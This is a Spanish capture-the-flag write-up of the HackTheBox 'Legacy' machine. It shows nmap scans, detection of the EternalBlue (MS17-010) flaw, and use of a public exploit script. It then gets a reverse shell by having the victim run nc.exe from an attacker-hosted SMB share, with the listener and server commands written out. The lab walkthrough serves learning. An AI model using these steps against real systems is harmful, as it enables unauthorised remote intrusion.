----
- Tags: #nmap-scripts #EternalBlue #netexec #smbserver
----
# Resolución

----
> En esta máquina a través de un reconocimiento con *scripts específicos* de **nmap** detectamos la vulnerabilidad **Eternal Blue** y se abusa de esta aprovechando un script de **Github** que permite ejecutar comandos. Para ingresar utilizamos un **nc.exe** que disponemos en nuestra máquina de atacante que entabla una **Reverse Shell** cuando la máquina víctima lo ejecuta a través de un servidor **SMB** de nuestra propiedad.
----
## Reconocimiento

### OS

**WINDOWS**
```shell
ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=267 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 266.896/266.896/266.896/0.000 ms
```

### NMAP

**Puertos**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec  5 16:42:04 2024 as: nmap -p- --open --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.27s latency).
Scanned at 2024-12-05 16:42:04 -03 for 17s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec  5 16:42:21 2024 -- 1 IP address (1 host up) scanned in 16.44 seconds
```

**Servicios**
```ruby
# Nmap 7.94SVN scan initiated Thu Dec  5 16:45:38 2024 as: nmap -sCV -p135,139,445 -oN services 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.27s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-12-10T23:43:25+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:1a:ce (VMware)
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m50s, median: 4d23h57m38s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  5 16:45:57 2024 -- 1 IP address (1 host up) scanned in 19.07 seconds
```

#### **Script de NMAP personalizado** **``.lua``**

Como nos interesa que el servicio que corre por el *puerto 445* es un **``smb``**, utilizaremos ``nmap`` para realizar un escaneo especifico para ese puerto en concreto.

Filtramos para ver todas las **categorías** de los scripts de nmap de la siguiente forma.

- ``locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort | uniq``

Luego en mi caso es de interés fusionar la categoría *``safe``* y la categoría *``vuln``* ya que de esta forma actúan como *checkers* al juntarlas.

- **``nmap --script "vuln and safe" -p445 10.10.10.4 -vvv -oN smbScan``**

**``smbScan``**
```ruby
# Nmap 7.94SVN scan initiated Tue Dec 10 18:44:08 2024 as: nmap --script "vuln and safe" -p445 -vvv -oN smbScan 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received reset ttl 127 (0.26s latency).
Scanned at 2024-12-10 18:44:09 -03 for 16s

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Dec 10 18:44:25 2024 -- 1 IP address (1 host up) scanned in 17.48 seconds
```

## Explotación

### Vulnerabilidad MS17-010

Una vez realizado toda la etapa de reconocimiento, comenzamos con la explotación.
Previamente vimos a través de los scripts de ``nmap`` que la máquina *Legacy* es vulnerable a **Eternal Blue**, por lo tanto vamos a recurrir a Github para buscar un repositorio que contenga un exploit para el *``CVE-2017-0143``*, en mi caso encontré el siguiente [repositorio](https://github.com/worawit/MS17-010) en el cual se explota dicha vulnerabilidad.

Dentro de el repositorio se encuentra también un **``checker.py``** que realiza un escaneo para detectar si la víctima es vulnerable o no y a que **PIPES** lo es.

![[L 1.png]]

Basta con que aparezca un "*Ok*" en cualquiera de los **``Named Pipes``** del *``checker.py``* para que podamos explotarlo.

En mi caso utilizaremos el script **``zzz_exploit.py``** que al ejecutarlo nos pedirá la ip de la víctima y el nombre de la **named pipe** vulnerable que previamente vimos.
Antes de hacer lo anterior primero tenemos que **modificar** el script, ya que este por defecto crear un archivo ``.txt`` en la unidad lógica *``C:\\``* de la máquina víctima, pero nosotros queremos generar un **RCE**.

Primero filtramos con ``nvim`` por la cadena ``cmd``, luego comentamos lo siguiente.

![[L 2.png]]

Ahora descomentamos y modificamos la siguiente cadena que es de nuestro interés.

![[L 3.png]]

De esta forma con este método vamos a enviar un *``ping``* a nuestra máquina de atacante una vez ejecutemos el script mientras nosotros estaremos en escucha con *``tcpdump``* a la espera de **trazas ICMP** en la interfaz **``tun0``**, en el caso de que nosotros recibiéramos **cuatro paquetes** de la máquina víctima, quiere decir que **tenemos RCE**.

- ``tcpdump -i tun0 icmp -n``
- **``python2.7 zzz_exploit.py 10.10.10.4 browser``**

![[L 4.png]]

Recibimos correctamente las trazas **ICMP** de la máquina víctima, por lo tanto tenemos RCE, ahora simplemente realizamos una **Reverse Shell**.

----
### Reverse Shell

Para entablar la Reverse Shell lo que haremos será traernos una copia del **``nc.exe``** ubicado en nuestro ``Seclists`` ---> **``locate nc.exe``**

Abrimos un **servidor** **``smb``** ofreciendo el ``nc.exe`` que está en nuestro directorio actual de trabajo.

- **``impacket-smbserver smbFolder $(pwd) -smb2support``**

Nos ponemos en escuchar por el **puerto 443**

- **``rlwrap nc -nlvp 443``**

Modificamos el Script para que la máquina víctima consulte a nuestro servidor ``smb`` y ejecute el **``nc.exe``** para que luego **apunte** la conexión a nuestra máquina de atacante al listener de ``nc`` que tenemos por el *puerto 443*.

![[L 5.png]]

Por último ejecutamos el script para recibir la conexión y ganar acceso a la máquina.

- **``python2.7 zzz_exploit.py 10.10.10.4 browser``**

![[L 6.png]]

## Escalada de Privilegios

Una vez dentro de la máquina Legacy reclamamos la **flag** del **usuario** y luego fácilmente reclamamos la **flag** de **root** ya que tenemos acceso a sus directorios porque en la mayoría de casos al explotar la vulnerabilidad **Eternal Blue** ganamos acceso **como usuario privilegiado**.